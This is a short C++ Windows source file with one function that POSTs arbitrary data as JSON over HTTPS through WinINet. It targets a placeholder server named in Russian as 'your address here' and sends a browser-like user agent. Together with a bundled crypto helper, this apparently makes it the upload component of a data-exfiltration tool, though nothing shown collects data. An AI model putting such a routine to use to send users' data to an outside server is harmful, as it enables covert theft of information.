#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include "../../include/utils/crypto.h"

#pragma comment(lib, "wininet.lib")

void SendData(const std::string& data) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, "ваша-адрес-тут.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            const char* accept[] = {"application/json", NULL};
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/endpoint", NULL, NULL, accept, INTERNET_FLAG_SECURE, 0);
            
            if (hRequest) {
                std::string headers = "Content-Type: application/json";
                HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}